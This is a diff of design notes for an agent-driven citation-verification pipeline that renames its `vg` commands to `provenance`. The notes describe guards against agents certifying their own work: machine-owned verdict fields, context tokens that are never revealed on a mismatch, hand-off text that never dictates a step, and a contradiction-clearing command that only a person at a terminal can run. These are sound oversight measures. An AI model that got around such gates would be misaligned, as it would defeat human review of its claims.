@@ -31,10 +31,10 @@ Two mechanisms enforce it, and both are load-bearing:
    A machine field that has to survive a strip-and-write-back lives outside the claim file
    and is re-applied: verdicts in `judgments/`, snapshots in `archives.json`.
 2. `revalidate_from_cache()` re-derives every row that counts as evidence from the cached
-   page, offline, on every `vg build`. A status the pipeline did not produce cannot
+   page, offline, on every `provenance build`. A status the pipeline did not produce cannot
    reproduce, so it downgrades to `human_review` instead of rendering green.
 
-"Reproduce" means passing the **full** offline check `vg verify` runs — source class,
+"Reproduce" means passing the **full** offline check `provenance verify` runs — source class,
 snippet rules, served status, presence and uniqueness — not just finding the words.
 `citation_problem()` and `check_page()` in `verify.py` are that check, and both commands call
 them; a rule added anywhere else is one build will not enforce. Build's re-check once covered
@@ -48,7 +48,7 @@ reproducible status while keeping the file's other fields let a fabricated excer
 included: they never render green, but they count toward corroboration. Rebuilding refines a
 row that already matches (a normalized match now exact) and never promotes one into a match: a
 `verified` that is only a normalized match now, or a paywall row whose cached page reads fine,
-goes to `human_review` for `vg verify` to re-derive.
+goes to `human_review` for `provenance verify` to re-derive.
 
 The support verdict follows the same rule. Build resets every source without a usable
 recorded verdict to `unreviewed` before rendering (`judgments.merge()`), so a `support` sitting
@@ -56,14 +56,14 @@ in a claim file never renders. See "A gate is a number the tool prints" below.
 
 **Agent-supplied input can refuse, never grant.** Sometimes only the agent knows a fact the
 pipeline needs. The verifier's context token is one: nothing on disk says which context a
-verifier read, so `vg judge --context` takes it from the agent (see "Tie a verdict to the
+verifier read, so `provenance judge --context` takes it from the agent (see "Tie a verdict to the
 context it was handed" below). That is safe only because the value can do nothing but block.
-A token matching the current hand-off gets exactly what `vg judge` recorded before tokens
+A token matching the current hand-off gets exactly what `provenance judge` recorded before tokens
 existed, and any other token writes nothing. Nothing an agent passes this way may promote a
 status, mark a source judged, or pick the copy a verdict is checked against. And a refusal must
 not hand back the value that would have passed: a mismatch that printed the current token
 would let a verifier retry blind, with a verdict about text it never read. The same reasoning
-covers the trusted reads of a claim file's `context_page` and `query_run` in `vg judge`.
+covers the trusted reads of a claim file's `context_page` and `query_run` in `provenance judge`.
 
 If you add a command that reads `data/claims/`, decide deliberately which side of that line
 it sits on. Defaulting to trust is how the invariant erodes.
@@ -95,7 +95,7 @@ own evidence disagree, which `conflicts.py` treats as a finding, not noise to av
   It outranks `not_found` too: a contradicted absence claim says the record it could not find
   is there.
 - **The conflicts section as well.** The status is what every triage surface reads: the
-  counts, the review filter, `vg status`, and `derives_from`, so a conclusion drawn from the
+  counts, the review filter, `provenance status`, and `derives_from`, so a conclusion drawn from the
   claim goes to review with it. A line in the conflicts section reaches none of those. It does
   say why the claim is in review, and it does so where the review app says to resolve things
   first. So the choice was both, and each contradicting source is listed there with the
@@ -120,14 +120,14 @@ Each of these is load-bearing:
 - **The status and the conflict line**, rebuilt from the shard on every build. The field is
   machine-owned: stripped from agent-authored files, and overwritten, never read, when build
   loads a claim file trusted.
-- **Nothing else takes it out of the shard.** Re-homing (`vg remap --apply`, bare `vg
+- **Nothing else takes it out of the shard.** Re-homing (`provenance remap --apply`, bare `provenance
   judgments --repair`) archived every verdict its claim no longer cites as lapsed, which would
   have released the claim in silence. The issue proposed teaching re-homing to keep a
   `contradicts` with its claim. #101 retires re-homing instead: question ids are stable and
   claims do not move between them, so no command moves or archives a verdict, and clearing
   (below) is the one way out.
 - **Clearing is a command, and it is on the record.** Dropping the source is sometimes right:
-  the verifier was wrong, or the claim was re-scoped. `vg clear-contradiction QID SID` moves the
+  the verifier was wrong, or the claim was re-scoped. `provenance clear-contradiction QID SID` moves the
   verdict to `judgments-archive/<stamp>/` with a `CLEARED` note holding the reason. The archive
   is complete or absent (built beside its name, then renamed), and it and every directory above
   it are durable before the shard is rewritten. A failure that leaves the shard holding the
@@ -142,7 +142,7 @@ Each of these is load-bearing:
   the shard it sits in, and clearing one that judged another claim costs that claim nothing: it
   is judged by the verdicts in its own shard, or waits for a verifier.
 - **Only a person can clear one, and that is a step that fails, not a sentence.** The command
-  is named wherever the contradiction is, including `vg judgments`, which agents run, and the
+  is named wherever the contradiction is, including `provenance judgments`, which agents run, and the
   whole point of the command is to release a claim from review: the thing an agent is steered
   toward. So it asks for the reason at a terminal and refuses when stdin is not one, which is
   how an agent's shell tool runs everything (`cli._at_a_terminal()`). The first version took
@@ -154,21 +154,21 @@ Each of these is load-bearing:
 "No longer cites" is by sid, so a retry that keeps the page and changes the quote holds the
 claim too: a new quote can be a more agreeable passage of the page that argued against it. The
 conflict line says the claim "no longer cites [it] as it did", since which one changed is not
-recorded (#90). A verdict filed under a claim before `vg judge` checked that the claim cites
+recorded (#90). A verdict filed under a claim before `provenance judge` checked that the claim cites
 its source is held the same way. Both fail toward review, where a person reads the note and
 clears it.
 
 A dropped contradiction is never checked for staleness. `is_stale()` compares a verdict with
-the source it judged, which the claim no longer carries, and `vg judge` refuses a source nothing
+the source it judged, which the claim no longer carries, and `provenance judge` refuses a source nothing
 cites, so a stale one could never be re-judged. It holds until the source is cited again, which
-applies and checks it as usual, or until a human clears it. `vg judgments` names these apart
+applies and checks it as usual, or until a human clears it. `provenance judgments` names these apart
 from lapsed verdicts and leaves them out of its gate, which counts only what a verifier can
 close.
 
-Rejected: making `vg verify` or `vg check-claim` refuse such a claim. A refusal in `vg verify`
+Rejected: making `provenance verify` or `provenance check-claim` refuse such a claim. A refusal in `provenance verify`
 stops the mechanical pass for a whole run over one claim's triage question. It also reaches
-none of the surfaces the status does: the review filter, `vg status`, `derives_from`. A refusal
-in `vg check-claim` blocks a researcher who has to drop the source for a good reason (the page
+none of the surfaces the status does: the review filter, `provenance status`, `derives_from`. A refusal
+in `provenance check-claim` blocks a researcher who has to drop the source for a good reason (the page
 is gone, the question was narrowed) with a failure only a human can clear. The status gate
 makes the drop pointless, and that is what the prose rule was for. Also rejected: a `cleared`
 flag on the verdict itself. Shard entries are exactly `Judgment`, an older checkout refuses
@@ -199,7 +199,7 @@ to review, so the cost was measured on two real runs first:
   figures is in a snippet. An answer with one sourced figure beside an unsourced one passes,
   and so does evidence with no figure at all. Widening either changes the cost, so measure it
   again first. It reads snippets only, so a figure a query citation reproduces is not
-  evidence to it yet (#81), and a researcher's `vg check-claim` does not run it (#82). (3),
+  evidence to it yet (#81), and a researcher's `provenance check-claim` does not run it (#82). (3),
   near misses across claims, prompts across questions and stays a flag.
 - **A misread figure is a false conflict.** Two parsing errors read one number as two. A unit
   came from the next word's first letter, so "$5,000 more" was five billion dollars. And units
@@ -212,7 +212,7 @@ to review, so the cost was measured on two real runs first:
   Amounts under $10 and fractional amounts now show cents.
 
 `detect()` reads verdicts now, so `_settle()` runs it once they are applied, after
-revalidation and corroboration and before `check_inputs()`. `vg build` and `vg status`
+revalidation and corroboration and before `check_inputs()`. `provenance build` and `provenance status`
 used to run it first, on claim files loaded with their machine fields trusted. There `support`
 is whatever the file says. A `contradicts` typed into a claim file would have been listed, and
 a recorded one missed. Anything that reads a verdict runs after `judgments.merge()` has applied
@@ -220,7 +220,7 @@ the recorded ones.
 
 Verdicts live in `data/judgments/`, one shard per question keyed by source id — **never in
 the claim file**.
-`vg verify` reloads claims with `strip_machine_fields()` on (that is what stops a researcher
+`provenance verify` reloads claims with `strip_machine_fields()` on (that is what stops a researcher
 self-certifying), so a verdict written inline is destroyed by the next verify run. Keying by
 source id also means a judgment lapses on its own when a retry changes the quote, which is
 correct: it was a judgment about different words. The answer is the other half of what was
@@ -251,18 +251,18 @@ So `load()` raises `UnreadableJudgments` naming the file, and so does `load_ever
 directory it cannot list. Only a file that is really missing reads as empty. For bad entries
 the error also names each entry's index and every problem with it, all in one message, so a
 repair is not a loop of re-runs. Every command that reads verdicts stops on the error with
-the file named: through `_judgments_or_exit()`, or, for `vg judge`, through its existing
+the file named: through `_judgments_or_exit()`, or, for `provenance judge`, through its existing
 `ValueError` handler around `record()`. Both escape the message, because it quotes the
 file's own text and rich reads brackets as markup.
 
-- **Read everything before acting on any of it.** `vg verify` reads every claim's verdict
+- **Read everything before acting on any of it.** `provenance verify` reads every claim's verdict
   file before it fetches anything, so a malformed shard for a later claim stops the run before
   any network time is spent, not after the earlier claims' pages are fetched.
 - **Write only what can be read back.** `record()` refuses an entry `load()` would refuse, so
-  one bad `vg judge` call cannot stop every reader of the shard.
+  one bad `provenance judge` call cannot stop every reader of the shard.
 - **Replace a shard whole.** `_write()` writes and fsyncs a temp file, then `os.replace`s it
   into place. A reader refuses a partial file, and verifier agents write while other commands
-  read, so an in-place write would let a background `vg judge` stop a concurrent `vg build`.
+  read, so an in-place write would let a background `provenance judge` stop a concurrent `provenance build`.
 - **Repair, don't delete.** Rewrite a malformed file as a JSON list of verdicts, and fix a bad
   entry in place. Deleting either to get past the error discards the verdicts it holds, so
   the message says so to the agents and humans who see it.
@@ -284,7 +284,7 @@ shards (see "Question ids are stable and never reused"). Every re-home had to gu
 from a sid or trust an operator's mapping, and both put verdicts on claims they never judged.
 
 `record()` holds an `flock` on `judgments/` across its read and write, and readers take it
-shared. Verifier agents record in parallel, so a `vg judge` landing between another's read and
+shared. Verifier agents record in parallel, so a `provenance judge` landing between another's read and
 its rewrite would otherwise be deleted by the rewrite. The wait is bounded (`LOCK_TIMEOUT`):
 every holder needs milliseconds, and a verifier blocked forever behind a stuck process would
 report nothing.
@@ -299,7 +299,7 @@ verified while q17 went to `human_review` later in the same build. It also ran i
 one level deep, so a claim could read an input whose own inputs had not been checked yet.
 Now `check_inputs()` runs last and walks `derives_from` inputs-first, so a downgrade reaches
 every claim built on it. A cycle is reported and its members marked unmet, not looped. The
-order lives in one place, `cli._settle()`, which `vg build` and `vg status` both call: a new
+order lives in one place, `cli._settle()`, which `provenance build` and `provenance status` both call: a new
 command that reads `c.status` should call it too, rather than repeat the sequence. Conflict
 detection comes after the verdicts, since a `contradicts` verdict is a conflict, and before
 `check_inputs()`, so the conflicts that explain a status are settled before any status is read.
@@ -340,7 +340,7 @@ A paywalled newspaper story we cannot fetch is still a good citation; the human 
 archive snapshot or a subscription. Failing it would push researchers toward worse,
 freely-scrapeable sources — the opposite of what we want.
 
-`vg archive` saves a **fresh** snapshot rather than accepting whatever is already in the
+`provenance archive` saves a **fresh** snapshot rather than accepting whatever is already in the
 Wayback Machine, and then re-checks paywalled snippets against it (`verified_via_archive`).
 Both matter for the same reason: on a paywalled row the snapshot is the human's only route
 to the text, so a stale capture that predates the quote is worse than no snapshot at all —
@@ -348,7 +348,7 @@ it looks like verification.
 
 **Nor is a paywalled row left waiting on a verdict.** A `could_not_verify_paywall` row has no
 confirmed context: the live page is gated, and no snapshot confirmed the quote. So the judgment
-pass cannot cover it. `vg judge` refuses it (there is no copy to stamp), and a verdict recorded
+pass cannot cover it. `provenance judge` refuses it (there is no copy to stamp), and a verdict recorded
 on it reads stale. The roll-up's "unreviewed means pending" rule still counted it, and that rule
 runs before the paywall branch. Every claim resting on a paywalled source therefore read
 `pending` forever: waiting on a judgment pass that could never record anything, with no paywall
@@ -358,7 +358,7 @@ So a paywalled row is outside the judgment pass (`models.NOT_JUDGED`, read by
 `Source.awaits_verdict`). Its claim rolls up to the yellow paywall flag unless something
 outranks it: a failed citation, a `contradicts` verdict, an answer whose figures no snippet
 carries, a readable source still waiting on
-its verdict, or one `vg verify` has not reached (`pending`, even if a verdict landed on it by
+its verdict, or one `provenance verify` has not reached (`pending`, even if a verdict landed on it by
 sid). Past those,
 the paywall branch applies the all-verified branch's rules, with the flag standing in for green.
 Only `corroboration_ok: true` earns the flag, unchecked corroboration is `pending`, and failed
@@ -366,7 +366,7 @@ corroboration is `human_review`. The flag is not a pass, and it sits outside the
 so an adversarial claim one document short must not hide behind it. A source the verifier
 judged `topic_only` or `superseded` is left out of the count, as it is beside a verified one.
 
-The route to a verdict is the snapshot. Once `vg verify` or `vg archive` confirms the quote in
+The route to a verdict is the snapshot. Once `provenance verify` or `provenance archive` confirms the quote in
 the run's own snapshot, the row is `verified_via_archive`, its context is that snapshot, and it
 waits on a verdict like any other row.
 
@@ -383,16 +383,16 @@ classified rather than read `pending` forever.
 A scanned PDF serves fine and extracts to nothing but the `[[page N]]` markers
 `_extract_pdf()` inserts. That text is truthy, so every `not page.text` check let it through
 to the search, which found nothing: `snippet_not_found`, "the quote was reconstructed rather
-than copied", and from `vg check`, "Do not cite this". A real citation to a real filing,
+than copied", and from `provenance check`, "Do not cite this". A real citation to a real filing,
 called fabricated — the verdict that pushes a researcher to substitute a copy they can read.
 
 `fetch.has_text()` is the one test for "is there anything to search". Wherever page text is
 read, use it, never `not page.text` — or `fetch.unreadable_reason()` where an error or a
 non-2xx page must count as unreadable too, since a bot challenge has text. Two changes each
 re-derived it as `page.text.strip()` within a day of it being made shareable, which is how
-this gap reopens. `vg check` calls the verifier's own `snippet_problem()` and
+this gap reopens. `provenance check` calls the verifier's own `snippet_problem()` and
 `check_snippet()` rather than re-implementing them, so a researcher's self-check judges a
-snippet and a page exactly as `vg verify` does (source class aside: that needs the whole
+snippet and a page exactly as `provenance verify` does (source class aside: that needs the whole
 citation).
 
 A PDF that served with no text is `human_review`, with a reason saying what to do (confirm
@@ -410,7 +410,7 @@ PDF searchable, and a quote on a scanned page came back `snippet_not_found`.
 definition of "no text". A miss whose `page` names one of them is the scan case, on that page.
 A miss with no such `page` stands, since a blank page is common and downgrading every miss on
 one would weaken the fabricated-quote check; its reason names the text-less pages instead.
-That makes `page` part of the check, so `vg check` takes `--page`. A text-less page may be
+That makes `page` part of the check, so `provenance check` takes `--page`. A text-less page may be
 blank rather than scanned, and the extraction can't tell, so `page` pointed at a blank page
 also reaches `human_review`: still a failure, never green, and its reason tells the human a
 blank page means the quote is not there. Telling the two apart is #28.
@@ -423,7 +423,7 @@ a paywalled row, the human's only route to the text — and `archive_unconfirmed
 for nothing. So a miss on a capture with text-less pages is unconfirmed, naming them. Copying
 the first rule into the second path is what made it wrong there.
 
-Still open: `vg check-claim` fails a kept scan however it is cited, so the researcher agent is
+Still open: `provenance check-claim` fails a kept scan however it is cited, so the researcher agent is
 told to hand that one failure on (#29).
 
 ## Text the pipeline inserted is never evidence
@@ -448,10 +448,10 @@ an unopenable file is not known to be a document at all, and the common case is 
 ## Rich reads brackets as markup
 
 `con.print()` and `Table.add_row()` treat `[...]` as a style tag. Page text printed raw showed
-`[[page 1]]` as `[]` and dropped `[sic]`, so `vg fetch` hid the page breaks a researcher cites
-by, a snippet copied from its output was not on the page, and `vg check-claim` reported a
+`[[page 1]]` as `[]` and dropped `[sic]`, so `provenance fetch` hid the page breaks a researcher cites
+by, a snippet copied from its output was not on the page, and `provenance check-claim` reported a
 refused marker as "snippet contains [], a page locator". And a `[/]` with nothing open raises
-`MarkupError`: one in a verdict note crashed `vg judge` after the verdict was on disk, and one in
+`MarkupError`: one in a verdict note crashed `provenance judge` after the verdict was on disk, and one in
 a claim's id turned the "skipped as unreadable" line into a traceback in every command that
 loads claims.
 
@@ -481,8 +481,8 @@ literals go in bare.
   of control bytes show four times as wide and fold the table; a cut after it can end inside
   an escape, which then reads as another character. `_cut()` counts what is shown and stops
   between escapes.
-- **An escape is text the pipeline inserted.** A snippet copied from `vg fetch` with one in it
-  (`co\xadoperate` for a soft hyphen) is on no page, and an `expected` copied from `vg query`
+- **An escape is text the pipeline inserted.** A snippet copied from `provenance fetch` with one in it
+  (`co\xadoperate` for a soft hyphen) is on no page, and an `expected` copied from `provenance query`
   with one matches no export. So wherever data is printed to be copied from (page text, a
   query value, a recipe response, a YAML entry), `cli._say_if_escaped()` says so under any of
   it that had to be escaped. That note, and not a narrower definition of what to escape, is
@@ -491,17 +491,17 @@ literals go in bare.
   a CR to show as `\x0d`.
 - **Escaping each value is not escaping the message.** `escape()` neutralises only a tag complete
   inside the value it is given. `[/` in one value and `x]` in the next, with plain text between,
-  still made the closing tag `[/ x]`: `vg form700 '[/' 'x]'` raised, and so did
-  `vg handoff '[/' --data 'x]'` instead of refusing. In a line, escape a run of data as one
+  still made the closing tag `[/ x]`: `provenance form700 '[/' 'x]'` raised, and so did
+  `provenance handoff '[/' --data 'x]'` instead of refusing. In a line, escape a run of data as one
   string: `escape(_printable(f"{first} {last}"))`, not `{escape(first)} {escape(last)}`. Or
-  print the whole message as one `Text`, as `cli._refuse()` does for the refusals `vg judge`
-  and `vg handoff` print.
-- **Refuse a malformed argument before anything prints it.** `vg judge`, `vg handoff` and
-  `vg clear-contradiction` check the question id with `judgments.path_for()` first, so the id
+  print the whole message as one `Text`, as `cli._refuse()` does for the refusals `provenance judge`
+  and `provenance handoff` print.
+- **Refuse a malformed argument before anything prints it.** `provenance judge`, `provenance handoff` and
+  `provenance clear-contradiction` check the question id with `judgments.path_for()` first, so the id
   they print afterwards is a pattern-checked one.
 - **In a table, a data cell is `Text(value)`.** `escape()` adds a backslash to a value ending in
   one, and only a tag that follows takes it back, so at the end of a cell it printed. Truncated
-  names end anywhere. The `vg verify` and `vg judgments` tables still use `escape()` cells, and
+  names end anywhere. The `provenance verify` and `provenance judgments` tables still use `escape()` cells, and
   so does an escaped run at the end of a line (#117).
 - **A whole value that is data is printed as `Text` with `soft_wrap=True`.** That covers page
   text, a query value, a recipe response and a pasted cURL entry. It is what a researcher
@@ -533,11 +533,11 @@ around it. In `[yellow]{x}[/]`, an `x` of `[/] [sic]` closes yellow, opens `[sic
 line's own `[/]` closes that: nothing raises, and nothing prints. So assert that the text comes
 out as written, not only that nothing raised (`tests/test_cli_markup.py`). For control
 characters, `tests/test_cli_control_chars.py` runs each command with them where it prints data,
-and its `_vg()` fails on any character that acts on a terminal anywhere in the output.
+and its `_provenance()` fails on any character that acts on a terminal anywhere in the output.
 
 A print that raised leaves its text in rich's buffer, and every later print in the process tries
 to write it again. In the test suite, one surrogate crash failed every CLI test after it, each
-quoting the first one's text. `test_cli_control_chars._vg()` empties `cli.con._buffer` after each
+quoting the first one's text. `test_cli_control_chars._provenance()` empties `cli.con._buffer` after each
 run, so a regression fails only its own test. It also turns colour off rather than stripping
 rich's SGR codes from the output, since the strip would also remove a leaked `\x1b[8m`
 (conceal).
@@ -557,7 +557,7 @@ by assignment (#132).
 ## A verdict is about a source as cached at judgment time
 
 Three staleness bugs in one night, all the same shape and caught by three different amounts of
-noise: a stale `expected` value was caught **loudly** by `vg check-claim`; a stale cached page
+noise: a stale `expected` value was caught **loudly** by `provenance check-claim`; a stale cached page
 is now caught **automatically** by `EXTRACTOR_VERSION`; a stale *judgment* was caught by
 **nothing**. Six verdicts said "roster-only, no bill number" about pages that, after a
 re-fetch, contain the bill number.
@@ -573,7 +573,7 @@ the supporting text — ships a green row nobody checked, by the same mechanism.
 
 **A verdict also names the claim it judged (#30).** A sid covers the quote, not what the claim
 says about it, so a retry that rewrites the answer and keeps the quote kept the verdict too.
-`vg judge` now stamps `claim_fingerprint` on every verdict: `Claim.fingerprint`, a short hash of
+`provenance judge` now stamps `claim_fingerprint` on every verdict: `Claim.fingerprint`, a short hash of
 the claim's question and answer. A verdict whose stamp no longer matches its claim judged words
 the claim no longer says, and is stale (#74, "A verdict is about the answer it judged, too").
 Why that identity:
@@ -584,45 +584,45 @@ Why that identity:
 - **Not the sources.** A verdict judges one of them, and adding another must not lapse it.
 
 Rejected: an id minted when the claim is first written. Claim files are agent-authored and
-rewritten by `vg verify`, and an id that survives a retry says nothing about whether the answer
+rewritten by `provenance verify`, and an id that survives a retry says nothing about whether the answer
 changed, which is the whole question. The fingerprint is recomputed from what the claim says, by
-the pipeline, and `vg judge` takes no flag for it.
+the pipeline, and `provenance judge` takes no flag for it.
 
 Where it stops. Verdicts from before stamping carry none, and nothing backfills one (they read
 stale: see #74's section). Older
 checkouts refuse a shard holding a stamped verdict (an unknown key), the safe side. And the
-stamp is the claim as `vg judge` reads it, not the text the verifier was handed: a rewrite
+stamp is the claim as `provenance judge` reads it, not the text the verifier was handed: a rewrite
 between hand-off and recording is the hand-off token's to catch (#36), and one after recording
 is this stamp's.
 
-**The stamp and the check must read the same cache.** They didn't. `vg judge` stamped from the
+**The stamp and the check must read the same cache.** They didn't. `provenance judge` stamped from the
 shared cache (`_cache_root()`, so `data/cache`), while `apply_to()` looked the page up under
 the data dir it was handed. For a candidate run that is `data/<candidate>/cache`, where the page
 normally isn't, and a missing page reads as "not stale": the check compared nothing and passed
 the verdict. Both sides now go through one lookup (`judgments.judged_copy()` / `is_stale()`).
 `cache_root` is a required keyword on `verdicts_for()` and `apply_to()`, because defaulting it
 to the data dir *is* the bug. Every caller passes `_cache_root(data, cache)`, and every command
-that resolves a cache root takes `--cache` (`vg query` and the `vg calaccess` subcommands
+that resolves a cache root takes `--cache` (`provenance query` and the `provenance calaccess` subcommands
 included). If you override `--cache` for build, override it for judge too.
 
 The miss did not stay a miss. `load_cached()` went through `cache_dir()`, which mkdirs, so the
 first check of a recorded verdict created `data/<candidate>/cache/pages`, and `_cache_root()`
 then preferred that directory to the shared one. From there every command for the candidate ran
 on a forked, near-empty cache: stamp and check agreed again, but about the wrong copy, and
-`vg build` downgraded sources for want of a cached page. A read now creates nothing. A lookup
+`provenance build` downgraded sources for want of a cached page. A read now creates nothing. A lookup
 that creates the thing it looks for can change where the next lookup goes.
 
 **No page to compare against means stale, not fresh.** Even with one root, `is_stale()` returned
 "" whenever the lookup came back empty (a deleted page, an unparseable cache file, a mistyped
-`--cache`), and `vg judge` wrote an empty stamp for an uncached page, which truthiness guards
+`--cache`), and `provenance judge` wrote an empty stamp for an uncached page, which truthiness guards
 then exempted from every check forever. Every path that cannot make the comparison now answers
 stale; fresh has to be shown. The same rule, three places:
-- `vg judge` refuses an uncached page (run `vg verify` first) and writes nothing. It also
+- `provenance judge` refuses an uncached page (run `provenance verify` first) and writes nothing. It also
   refuses unless the named claim, by exact case-sensitive id, cites the sid: `q07` for `q7`, a
-  sid another claim cites, or `Q1` on a case-insensitive disk (which `vg build` reads as
-  `q1.json` and `vg judgments` misses) each wrote a verdict nothing read, and said "recorded".
-  `vg judgments` names any shard filed under an id no claim has, and opens a shard by name as
-  `vg build` does, so the two agree about `Q1.json` on either kind of disk. Where the disk
+  sid another claim cites, or `Q1` on a case-insensitive disk (which `provenance build` reads as
+  `q1.json` and `provenance judgments` misses) each wrote a verdict nothing read, and said "recorded".
+  `provenance judgments` names any shard filed under an id no claim has, and opens a shard by name as
+  `provenance build` does, so the two agree about `Q1.json` on either kind of disk. Where the disk
   opens `Q1.json` as `q1.json`, it *is* q1's shard, which the disk decides and a source id does
   not (`judgments.opened_as()`). On a case-sensitive disk it is simply a shard no claim has:
   nothing reads it. Either way the fix is to rename it to the claim's exact id by hand.
@@ -643,16 +643,16 @@ See the next section for why that side has no bound.) A **query citation** has n
 and its result is re-run at every build; a changed query *definition* is query versioning's
 (below).
 
-**Stamp the copy the verifier read, not whatever is cached when `vg judge` runs.** Two bugs of
-one shape. The cache is shared, so another run can re-fetch a page between `vg verify` and
-`vg judge`: the verdict was stamped from the new copy, read fresh against it, and after the
+**Stamp the copy the verifier read, not whatever is cached when `provenance judge` runs.** Two bugs of
+one shape. The cache is shared, so another run can re-fetch a page between `provenance verify` and
+`provenance judge`: the verdict was stamped from the new copy, read fresh against it, and after the
 next verify rendered `verified, supports` on text no verifier saw. And an archive-verified
 context comes from the Wayback snapshot, but the stamp and the check both looked up the cited
 URL — the paywall stub, which never changes — so a verdict about snapshot A rode through every
 re-archive onto snapshot B. One mechanism covers both:
-- `vg verify` records the copy it built each context from (`Verification.context_page`: URL,
+- `provenance verify` records the copy it built each context from (`Verification.context_page`: URL,
   fetch time, extractor version), which is the snapshot for a `verified_via_archive` row.
-- `vg judge` stamps that copy (`Judgment.page_url` beside the time and version) and refuses
+- `provenance judge` stamps that copy (`Judgment.page_url` beside the time and version) and refuses
   when the cache no longer holds it, or when it is not where the context comes from now. The
   copy comes from a claim file loaded trusted, which is safe only because it can refuse and
   never grant: the stamp is read off the cached page, and the check below compares its URL.
@@ -661,37 +661,37 @@ re-archive onto snapshot B. One mechanism covers both:
   context from: one rule, not two copies that can drift). That is decided from the run's
   archive records, never from the claim file's `context_page`, so the records go on before any
   verdict is checked. For build and status that is `cli._settle()`, which now owns the whole
-  order (snapshots, then verdicts, then revalidation, corroboration and inputs). `vg judgments`
-  and `vg judge` apply them to archive rows themselves. One that forgets reads archive
-  verdicts stale, not fresh. `vg judgments` never applied them at all, and counted every
-  archive row as blocked whatever had been judged. `vg verify`'s own early `apply_to()` runs on
+  order (snapshots, then verdicts, then revalidation, corroboration and inputs). `provenance judgments`
+  and `provenance judge` apply them to archive rows themselves. One that forgets reads archive
+  verdicts stale, not fresh. `provenance judgments` never applied them at all, and counted every
+  archive row as blocked whatever had been judged. `provenance verify`'s own early `apply_to()` runs on
   stripped claims before anything is fetched, so it reads archive verdicts stale too; nothing
   it decides depends on that, and its write-back never carries a verdict.
-- **Every `vg archive` makes archive-row verdicts stale**, by design: it saves a fresh
+- **Every `provenance archive` makes archive-row verdicts stale**, by design: it saves a fresh
   snapshot, and a fresh snapshot is a different copy. It runs after the judgment pass, so it
-  says how many verdicts it left stale, and the skill says to run `vg judgments` again after
+  says how many verdicts it left stale, and the skill says to run `provenance judgments` again after
   it. Without that, every paywalled row reaches the review app unreviewed.
 
 One-time costs of the change, each failing toward re-checking. A claim verified before
-`context_page` existed has to go through `vg verify` again before `vg judge` accepts a verdict
+`context_page` existed has to go through `provenance verify` again before `provenance judge` accepts a verdict
 on it. A verdict on an archive row recorded before `page_url` existed was stamped from the stub,
 so it reads stale and needs judging again, and so does any verdict stamped from the cited page
 on a row now at `could_not_verify_paywall`: nothing shows whether it was about a snapshot the
 row has lost. It is not re-judgeable as it stands, so its reason says the row needs a context
-back from `vg archive` or `vg verify` first. `page_url` is written only when it names a snapshot
+back from `provenance archive` or `provenance verify` first. `page_url` is written only when it names a snapshot
 (`_WRITTEN_WHEN_SET`, as for the query-citation fields), so a shard of cited-page verdicts
 reads, and checks correctly, in a checkout from before this change. One snapshot verdict makes that
 checkout refuse its whole shard, and so every command that loads it — rather than check the
 verdict against the stub.
 
 **Tie a verdict to the context it was handed.** The copy check reads the claim file as it is when
-`vg judge` runs, so it cannot see what a verifier read earlier. Say a verifier is handed context
+`provenance judge` runs, so it cannot see what a verifier read earlier. Say a verifier is handed context
 C1, another run re-fetches the page, and a re-verify rebuilds the context as C2 from the new
 copy. The claim file then names a copy that is cached, the check passes, and the verdict about
 C1 renders green on C2. Every fact on disk was consistent; the one that was wrong, which
 context the verifier read, was on no disk. So the verifier says it:
-- `vg handoff <qid>` prints the claim and each source's context with a context token
-  (`judgments.context_token()`), from one read of the claim file `vg judge` checks. The token
+- `provenance handoff <qid>` prints the claim and each source's context with a context token
+  (`judgments.context_token()`), from one read of the claim file `provenance judge` checks. The token
   is a short hash of the hand-off as a whole (next paragraph). The verifier runs the command
   itself, so no transcription sits between what it reads and the token it hands back.
 - Everything it prints is agent- or page-authored, so it cannot be allowed to start a line.
@@ -702,16 +702,16 @@ context the verifier read, was on no disk. So the verifier says it:
   no verdict could be recorded on it at all.
 - What the pipeline itself prints there is facts, never a step to take. The verifier has Bash
   and acts on what the hand-off says. The query-run line first reused `describe_export()`,
-  whose undated-database wording tells an operator to run `vg calaccess build`. That rebuild
+  whose undated-database wording tells an operator to run `provenance calaccess build`. That rebuild
   moves every query run in the pipeline, so every token outstanding on a query citation stops
   matching.
-- `vg judge --context <token>` is required for every verdict. A query citation once needed
+- `provenance judge --context <token>` is required for every verdict. A query citation once needed
   none, on the grounds that `unjudgeable_query()` already ties it to its run. It does, but only
   to the run on disk when judge runs: a re-verify under a bumped definition rewrote that run,
   the check then agreed with the registry, and a verdict about the old calculation was stamped
   as current. The token is checked last, so a wrong verdict, id, sid or copy is still what a
   refusal names first.
-- A mismatch writes nothing and prints the `vg handoff` command to re-read, with the run's
+- A mismatch writes nothing and prints the `provenance handoff` command to re-read, with the run's
   `--data` and `--cache` (without them it reads the default run, whose `q1` is another claim).
   It never prints the current token (see "Agent-supplied input can refuse, never grant" above).
 
@@ -728,7 +728,7 @@ the list lacked:
 
 So `cli._handed()` builds what the hand-off prints as one value (`judgments.Handoff`),
 `cli._print_handoff()` reads nothing else, and the token hashes all of it but what
-`judgments._NOT_HASHED` names: the question id and the judged source's sid, which `vg judge`
+`judgments._NOT_HASHED` names: the question id and the judged source's sid, which `provenance judge`
 takes as arguments and checks itself, and each source's status and the reason it has nothing to
 judge. The other sources' sids are hashed, since a query citation's sid covers the figure it
 asserts and nothing else printed does.
@@ -751,13 +751,13 @@ The token guards the window from hand-off to judge, and no longer. A recorded ve
 by its sid, so one recorded beside a sibling that a later retry swaps out still applies: a
 verdict about a set of sources is #42.
 
-Handing out a token is a prediction that `vg judge` will record the verdict and `vg build` will
-keep it, so `vg handoff`, `vg judge` and `vg judgments` ask one function, `cli._unjudgeable()`.
+Handing out a token is a prediction that `provenance judge` will record the verdict and `provenance build` will
+keep it, so `provenance handoff`, `provenance judge` and `provenance judgments` ask one function, `cli._unjudgeable()`.
 It includes build's own rebuild, run on a copy (`_rebuild_problem()`): a claim file whose
 context is not what its cached copy gives (a hand edit, or a change to how contexts are cut)
-passed the copy check, and build dropped its verdict only until the next `vg verify` rewrote
+passed the copy check, and build dropped its verdict only until the next `provenance verify` rewrote
 the file; after that the verdict applied to a context nobody had read. That source is now
-refused by judge, gets no token, and counts as blocked on `vg verify`, not as waiting.
+refused by judge, gets no token, and counts as blocked on `provenance verify`, not as waiting.
 
 For a page, only the text is hashed, not the copy. Two copies of a page that give the same
 context get the same token, which is right: the verdict is about those words, and the copy the
@@ -768,17 +768,17 @@ and note prints a context identical to the old one, so a token over the text alo
 tell the two runs apart. Hash what the verdict is about, which is not always what the verifier
